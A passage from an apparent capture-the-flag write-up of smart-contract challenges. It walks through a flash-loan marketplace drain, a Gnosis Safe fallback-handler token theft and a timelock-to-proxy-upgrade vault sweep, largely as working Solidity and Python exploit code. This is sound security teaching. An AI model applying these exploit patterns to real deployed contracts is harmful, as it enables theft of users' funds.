<p>Then within the <code>uniswapV2Call()</code> function we have already received the tokens, so we can now do stuff with them, in this case, the first thing we need to do is convert the WETH to ETH, as the marketplace only accepts ETH:</p>
<pre class=" language-cs"><code class="prism  language-cs">IERC20(weth).approve(weth, type(uint256).max);
weth.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
</code></pre>
<p>All we need to take is 15 ether, as it’s all needed to take all the NFTs from the marketplace.</p>
<p>After withdrawing the ether, I create an array of integers with all the token IDs for the NFTs we want to buy. I defined this function to generate a dynamic array of integers with values from 0 to <code>size</code>:</p>
<pre class=" language-cs"><code class="prism  language-cs">function arrayOfIntegers(uint256 size) private returns (uint256[] memory) {
    uint256[] memory uintArray = new uint256[](size);
    for (uint256 i = 0; i &lt; size; i++) {
        uintArray[i] = i;
    }
    return uintArray;
}
</code></pre>
<p>I’m sure there’s much better ways to do this, but here we are. Anyway, With this function I generate the array:</p>
<pre class=" language-cs"><code class="prism  language-cs">uint256 amountOfOffers = marketplace.amountOfOffers();
uint256[] memory tokenIdsArray = arrayOfIntegers(amountOfOffers);
</code></pre>
<p>Which must be passed to the marketplace’s <code>buyMany()</code> function along with the 15 ether:</p>
<pre class=" language-cs"><code class="prism  language-cs">marketplace.buyMany{value: amount}(tokenIdsArray);
</code></pre>
<p>Then the NFTs must be transferred to the buyer, so we loop over token IDs and perform a <code>safeTransferFrom()</code>, I coded a short function for this to keep <code>uniswapV2Call()</code> cleaner:</p>
<pre class=" language-cs"><code class="prism  language-cs">function bulkSafeTransferNFT(uint256[] memory tokenIds) private {
    for (uint256 i = 0; i &lt; tokenIds.length; i++) {
        nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
    }
}
</code></pre>
<p>Then I call this function to send the corresponding purchased tokens to the buyer, so the attacker can get the payment for them:</p>
<pre class=" language-cs"><code class="prism  language-cs">bulkSafeTransferNFT(tokenIdsArray);
</code></pre>
<p>Then the amount to repay has to be computed, as there’s a 0.3% fee on top of the loan taken from Uniswap:</p>
<pre class=" language-cs"><code class="prism  language-cs">uint256 amountToRepay = amount + (((amount*3)/997)+1);
</code></pre>
<p>Then the loan can be repayed depositing the ETH to get WETH and transferring the WETH back into the pair address:</p>
<pre class=" language-cs"><code class="prism  language-cs">weth.functionCallWithValue(abi.encodeWithSignature("deposit()"), amountToRepay);
IERC20(weth).transfer(address(pair), amountToRepay);
</code></pre>
<p>Then finally I call a <code>recoverETH()</code> function I coded into the contract to obtain the net profits from the marketplace exploit:</p>
<pre class=" language-cs"><code class="prism  language-cs">function recoverETH() external {
    owner.sendValue(address(this).balance);
}
</code></pre>
<p>Where <code>owner</code> is the attacker address.</p>
<p>It’s important to note that there should be a <code>onERC721Received()</code> function which allows the contract to receive the NFTs through the marketplace’s safe transfer call.</p>
<p>Also, the contract needs to have a fallback function to receive Ether, as the marketplace will forward some when the purchases are made.</p>
<hr>
<h2 id="backdoor">Backdoor</h2>
<h3 id="challenge-description-10">Challenge description</h3>
<blockquote>
<p>To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.</p>
<p>To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.</p>
<p>Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.</p>
<p>Your goal is to take all funds from the registry. In a single transaction.</p>
</blockquote>
<h3 id="solution-10">Solution</h3>
<p>The Backdoor challenge tasks us with deploying a Gnosis Safe proxy for 4 users through a Gnosis Safe Proxy Factory. After each deployment, 10 DVT tokens will be distributed to each one of those users (the beneficiaries)</p>
<p>For the registry to accept each proxy creation as correct and to steal the tokens, we must code an attacker contract that makes the calls and passes a few conditions:</p>
<ol>
<li>The WalletRegistry contract must have enough DVT tokens to make the payment to the beneficiary</li>
</ol>
<pre class=" language-cs"><code class="prism  language-cs">require(token.balanceOf(address(this)) &gt;= TOKEN_PAYMENT, "Not enough funds to pay");
</code></pre>
<p>This does not directly depend on us, so we can continue.</p>
<ol start="2">
<li>The caller contract must be the GnosisSafeProxyFactory contract</li>
</ol>
<pre class=" language-cs"><code class="prism  language-cs">require(msg.sender == walletFactory, "Caller must be factory");
</code></pre>
<p>To achieve this, all we have to do is use the correct call when creating the proxy through the proxy factory contract. The call that invokes this function in the WalletRegistry (of course, specifying that this is the wallet registry that will receive the callback) is the function <code>createProxyWithCallback()</code>. This function takes the following parameters:</p>
<pre class=" language-cs"><code class="prism  language-cs">function createProxyWithCallback(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce,
    IProxyCreationCallback callback
)
</code></pre>
<ul>
<li>The <code>_singleton</code> address is the Gnosis Safe implementation contract address, which the WalletRegistry contract refers to as the <code>masterCopy</code>.</li>
<li>The <code>initializer</code> data, which is the data we will generate to call <code>setup()</code> (detailed on condition 3)</li>
<li>The <code>saltNonce</code> which we can just set as 0</li>
<li>The <code>callback</code>, which is the address to the WalletRegistry contract, but since it can only be passed as an IProxyCreationCallback interface, we must pass it as such <code>IProxyCreationCallback(registry)</code> by importing the interface at the top of the attacker contract</li>
</ul>
<ol start="3">
<li>The right singleton contract must be used</li>
</ol>
<pre class=" language-cs"><code class="prism  language-cs">require(singleton == masterCopy, "Fake mastercopy used");
</code></pre>
<p>This is covered by using the address of <code>masterCopy</code> (the Gnosis Safe implementation contract) correctly when calling <code>createProxyWithCallback()</code></p>
<ol start="4">
<li>We must be calling <code>setup()</code></li>
</ol>
<pre class=" language-cs"><code class="prism  language-cs">require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");
</code></pre>
<p><code>setup()</code> is the initializer function for a Gnosis Safe multisignature wallet. This function is in the Gnosis Safe implementation contract (GnosisSafe.sol) and it takes the following parameters:</p>
<pre class=" language-cs"><code class="prism  language-cs">function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
)
</code></pre>
<ul>
<li><code>_owners</code> must be an array with the addresses that will control this contract. Here we must input an array with a single element per multisig we initialize, one per user.</li>
<li><code>_threshold</code> is the number of required confirmations per transaction signed by the safe. E.g. if <code>_threshold</code> is 4 and the size of <code>_owners</code> is 7, then at least 4 out of the 7 owner addresses must sign for a transaction to go through. In this case, this value must be 1.</li>
<li><code>to</code> is a contract address to which an optional delegate call will be made, this can be set as the null address.</li>
<li><code>data</code> payload for that optional delegate call. This can be 0.</li>
<li><strong><code>fallbackHandler</code></strong> is the parameter which we will use to be able to exploit the wallets despite not being an owner of the wallet. This parameter is an address which will handle fallback calls to the contract, if we make a call that contains a function selector that does not match any function in the safe, then this selector and the calldata will be forwarded to a fallback contract which corresponds to the address of <code>fallbackHandler</code>. <strong>Here we can input the DVT token contract address</strong>.</li>
<li><code>paymentToken</code> is the address of a token that can be optionally used to pay gas fees for transactions, we won’t use gas tokens so this can be the null address as we want to use ETH to pay for txs.</li>
<li><code>payment</code> is the value that should be payed in case a gas token is used. We’ll use ETH, so this should be 0.</li>
<li><code>paymentReceiver</code> is the address that will receive the payment. This should be the null address so that it’s set to <code>tx.origin</code>.</li>
</ul>
<ol start="5">
<li>The <code>_threshold</code> parameter in the <code>setup()</code> call needs to be 1.</li>
</ol>
<pre class=" language-cs"><code class="prism  language-cs">require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
</code></pre>
<p>As specified in 4.</p>
<ol start="6">
<li>The <code>_owners</code> array must be of length 1, so each multisig wallet must have at most 1 owner.</li>
</ol>
<pre class=" language-cs"><code class="prism  language-cs">require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");
</code></pre>
<p>As specified in 4.</p>
<ol start="7">
<li>The owner set per multisig must be in the list of beneficiaries.</li>
</ol>
<pre class=" language-cs"><code class="prism  language-cs">require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");
</code></pre>
<p>After all requirements pass, the DVT tokens will be transferred to the created Gnosis Safe multisig. Each multisig will receive 10 DVT tokens.</p>
<p>To steall all the tokens in one transaction, we must create a function in the attacker contract that will perform the following workflow:</p>
<ol>
<li>
<p>Create the multisig for user <code>user</code>.</p>
<ul>
<li>The creation will assign the <code>fallbackHandler</code> as the DVT token contract address</li>
<li>The creation will assign the <code>callback</code> proxy creation callback interface to the WalletFactory contract</li>
</ul>
</li>
<li>
<p>Make a call to the newly created Gnosis Safe multisig for user <code>user</code> with function selector + calldata performing a token transfer. The function selector specified must be that of the <code>transfer()</code> function of the DVT token contract. The calldata should be the receiver of those tokens (the attacker address) and the amount should be the entire balance that the WalletRegistry will send to the newly created multisig (10 DVT tokens). This call will effectively transfer the 10 DVT tokens in that Safe to the attacker’s address.</p>
</li>
</ol>
<p>I decided to pass the calldata for the <code>setup()</code> and <code>transfer()</code> functions as a parameter to the function so that the contract is more readable:</p>
<pre class=" language-cs"><code class="prism  language-cs">function deploySafesAndStealTokens(bytes[] calldata maliciousSetupCalls, bytes calldata maliciousTransferCall) external {
    // loop over the malicious calls, creating a new proxy per loop
    // which will allow us to then call transfer after the token contract
    // is set up as a fallback contract for the wallet
    for (uint256 i = 0; i &lt; maliciousSetupCalls.length; i++) {
        GnosisSafeProxy newGnosisSafeWallet = gspf.createProxyWithCallback(
            singleton,
            maliciousSetupCalls[i],
            0,
            IProxyCreationCallback(registry)
        );
        
        // transfer tokens to tx.origin, the attacker
        (bool success,) = address(newGnosisSafeWallet).call(maliciousTransferCall);

        // make sure the transfer is made
        require(success, "tokens stealing failed");
    }
}
</code></pre>
<p>To generate the data for this calls I just used the <code>encode_input</code> method in Brownie:</p>
<ul>
<li><code>setup()</code> call</li>
</ul>
<pre class=" language-py"><code class="prism  language-py"><span class="token comment"># malicious calls list</span>
malicious_setup_calls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token comment"># loop over addresses</span>
<span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span> 

    <span class="token comment"># setup call encoding from master copy</span>
    malicious_setup_calls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>
        master_copy<span class="token punctuation">.</span>setup<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span>
            <span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token number">1</span><span class="token punctuation">,</span>
            ZERO_ADDRESS<span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            token<span class="token punctuation">.</span>address<span class="token punctuation">,</span>
            ZERO_ADDRESS<span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            ZERO_ADDRESS
        <span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
</code></pre>
<ul>
<li><code>transfer()</code> call</li>
</ul>
<pre class=" language-py"><code class="prism  language-py">token_stealing_call <span class="token operator">=</span> token<span class="token punctuation">.</span>transfer<span class="token punctuation">.</span>encode_input<span class="token punctuation">(</span>
    attacker<span class="token punctuation">.</span>address<span class="token punctuation">,</span> 
    AMOUNT_TOKENS_DISTRIBUTED <span class="token operator">//</span> <span class="token builtin">len</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span>
<span class="token punctuation">)</span>
</code></pre>
<p>And then just call the attacker contract function to do it all in one transaction:</p>
<pre class=" language-py"><code class="prism  language-py">attacker_contract<span class="token punctuation">.</span>deploySafesAndStealTokens<span class="token punctuation">(</span>
    malicious_setup_calls<span class="token punctuation">,</span> 
    token_stealing_call<span class="token punctuation">,</span> 
    _fromAttacker
<span class="token punctuation">)</span>
</code></pre>
<hr>
<h2 id="climber">Climber</h2>
<h3 id="challenge-description-11">Challenge description</h3>
<blockquote>
<p>There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.</p>
<p>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.</p>
<p>On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.</p>
<p>On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.</p>
<p>Your goal is to empty the vault.</p>
</blockquote>
<h3 id="solution-11">Solution</h3>
<p>The vulnerability in this challenge lies on the <code>execute()</code> function of the ClimberTimelock contract. This function essentially allows us to call any function in the contract unrestricted, as the <code>msg.sender</code> of that function call is the contract itself. Which is assigned the <code>ADMIN_ROLE</code> in the constructor of the contract:</p>
<pre class=" language-cs"><code class="prism  language-cs">_setupRole(ADMIN_ROLE, address(this));
</code></pre>
<p>Therefore, we must make a sequence of calls through the <code>execute()</code> function that would effectively allow us to drain the ClimberVault contract’s tokens.</p>
<p>We must code an attacker contract that will call the ClimberTimelock contract. The reason we do this (as it is technically possible to call the <code>execute()</code> function from an EOA) is because in order for <code>execute()</code> to be able to run all the code we need to run <code>schedule()</code> to schedule the action at some point, either before calling <code>execute()</code> or <em>through</em> <code>execute()</code>. However, it is not possible to call <code>schedule()</code> through <code>execute()</code> directly through the ClimberTimelock contract, as it will require <code>schedule()</code> to include its own call, which is not possible, as it would lead to an infinite chain of <code>schedule()</code> calls.</p>
<p>As a result, we must make it so that the attacker contract contains a <code>schedule()</code> function which passes the parameters of this <code>execute()</code> call to a <code>schedule()</code> call on the timelock contract.</p>
<p>I coded both an <code>attack()</code> and a <code>schedule()</code> function as follows:</p>
<pre class=" language-cs"><code class="prism  language-cs">function attack(bytes calldata payload) external payable {
    // save the calldata for later
    (targets, values, dataElements, salt) = abi.decode(payload, (address[], uint256[], bytes[], bytes32));

    // perform the malicious call
    timelock.execute(targets, values, dataElements, salt);
}

function schedule() external {
    timelock.schedule(targets, values, dataElements, salt);
}
</code></pre>
<p>Where <code>targets</code>, <code>values</code>, <code>dataElements</code> and <code>salt</code> (the parameters to be passed to <code>execute()</code> and <code>schedule()</code>) are defined as state variables and assigned to the variables when calling <code>attack()</code>.</p>
<pre class=" language-cs"><code class="prism  language-cs">address[] public targets;
uint256[] public values;
bytes[] public dataElements;
bytes32 public salt;
</code></pre>
<p>The calls required to be made through <code>execute()</code> as an initial setup to solve the challenge are the following:</p>
<ol>
<li>
<p><strong>Target:</strong> ClimberTimelock address.<br>
<strong>Value:</strong> 0.<br>
<strong>Data:</strong> We must update the timelock delay to 0 seconds by calling <code>updateDelay()</code> with the parameter 0. Therefore: <code>24adbc5b0000000000000000000000000000000000000000000000000000000000000000</code>.<br>
<strong>Why:</strong> The delay must be updated to immediately execute actions scheduled through <code>schedule()</code>, otherwise the calls will fail.</p>
</li>
<li>
<p><strong>Target:</strong> ClimberTimelock address.<br>
<strong>Value:</strong> 0.<br>
<strong>Data:</strong> We must call <code>grantRole()</code> with the <code>PROPOSER_ROLE</code> and the address of the attacker contract. Therefore (for my attacker contract address): <code>2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000261D8c5e9742e6f7f1076Fa1F560894524e19cad</code>.<br>
<strong>Why:</strong> This allows the attacker contract to <code>schedule()</code> actions, which is required to <code>execute()</code> them, though the scheduling can be done <em>within</em> the <code>execute()</code> call (reentrancy). This will be the 4th call.</p>
</li>
<li>
<p><strong>Target:</strong> ClimberVault address.<br>
<strong>Value:</strong> 0.<br>
<strong>Data:</strong> We must call <code>transferOwnership()</code> on the vault contract (the timelock contract can call it because it is created and set as owner when the vault is initialized: <code>transferOwnership(address(new ClimberTimelock(admin, proposer)));</code>). The call should transfer the ownership to the attacker address. Therefore (for my attacker address): <code>f2fde38b00000000000000000000000090F79bf6EB2c4f870365E785982E1f101E93b906</code>.<br>
<strong>Why:</strong> By transferring ownership to the attacker, the attacker can later swap the implementation of the ClimberVault contract to a contract which allows the attacker to sweep the tokens. For this we will need to code a contract which will replace ClimberVault, but must have the same storage layout.</p>
</li>
<li>
<p><strong>Target:</strong> Attacker contract address.<br>
<strong>Value:</strong> 0.<br>
<strong>Data:</strong> We must call <code>schedule()</code> in the attacker contract, a function whose body calls <code>schedule()</code> in the timelock contract and successfully schedules all the actions that have been so far executed, so that the execution of <code>execute()</code> can successfully finish. Therefore: <code>b0604a26</code>, which is just the function selector for <code>schedule()</code>. This value may change depending on how you name the function that calls <code>schedule()</code> in your attacker contract.<br>
<strong>Why:</strong> If the actions are not scheduled at some point, the <code>execute()</code> function cannot pass the require statement  in the following line: <code>require(getOperationState(id) == OperationState.ReadyForExecution);</code></p>
</li>
</ol>
<p>After all these steps have been completed through the <code>execute()</code> call, then we must code a new implementation contract and deploy it. I called this contract ClimberUpgrade and removed most of the functions and logic in ClimberVault. I only retain what I need, which is the same storage layout, the initializer without the additional logic which transfers ownership, sets a sweeper and a last withdrawal, the <code>_authorizeUpgrade()</code> function overridden and the <code>sweepFunds()</code> function without any modifiers, though <code>onlyOwner</code> can be optionally added since the attacker is the owner anyway thanks to the step 3 in <code>execute()</code>.</p>
<p>The ClimberUpgrade contract looks like this:</p>
<pre class=" language-cs"><code class="prism  language-cs">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;


    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize() initializer external {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address tokenAddress) external {
        require(IERC20(tokenAddress).transfer(msg.sender, IERC20(tokenAddress).balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
</code></pre>
<p>After deploying this contract, we call <code>upgradeTo()</code> on the ClimberVault proxy contract to upgrade to the malicious implementation ClimberUpgrade and then call <code>sweepFunds()</code> on the ClimberVault proxy contract, which will be calling the new and replaced <code>sweepFunds()</code> function with no modifiers, thereby sending the tokens to the caller.</p>
<h3 id="extras">Extras</h3>
<p>In order to get function selectors, something I didn’t quite know how to do in brownie at the time. I coded a GetSelector contract which I also deploy in order to obtain function selectors:</p>
<pre class=" language-cs"><code class="prism  language-cs">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GetSelector {
    function getSelector(string calldata _func) external pure returns (bytes4) {
        return bytes4(keccak256(bytes(_func)));
    }
}
</code></pre>
<p>Then made a lambda function in python which returns the selector in HexBytes:</p>
<pre class=" language-python"><code class="prism  language-python">get_selector <span class="token operator">=</span> GetSelector<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>_fromAttacker<span class="token punctuation">)</span>
gs <span class="token operator">=</span> <span class="token keyword">lambda</span> func<span class="token punctuation">:</span> get_selector<span class="token punctuation">.</span>getSelector<span class="token punctuation">(</span>func<span class="token punctuation">)</span>
</code></pre>
<p>Which I then convert to a hex string with the <code>.hex()</code> method:</p>
<pre class=" language-python"><code class="prism  language-python">gs<span class="token punctuation">(</span><span class="token string">'grantRole(bytes32,address)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>

